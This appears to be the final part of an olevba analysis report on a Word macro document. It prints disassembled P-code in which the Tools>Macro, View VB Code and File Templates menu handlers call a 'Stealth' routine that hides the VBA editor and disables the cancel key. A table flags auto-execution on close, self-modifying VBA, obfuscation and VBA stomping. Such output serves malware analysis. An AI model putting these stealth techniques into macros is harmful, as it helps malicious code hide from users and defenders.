' 	LitStr 0x0001 """
' 	Add 
' 	St CryptedString 
' 	EndIf 
' Line #140:
' 	EndSub 
' Line #141:
' 	FuncDefn (Private Sub ViewVBCode())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #142:
' 	FuncDefn (Private Sub ToolsMacro())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #143:
' 	FuncDefn (Private Sub FileTemplates())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #144:
' 	FuncDefn (Private Sub Stealth())
' Line #145:
' 	OnError (Resume Next) 
' Line #146:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #147:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #148:
' 	EndSub 
' Line #149:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

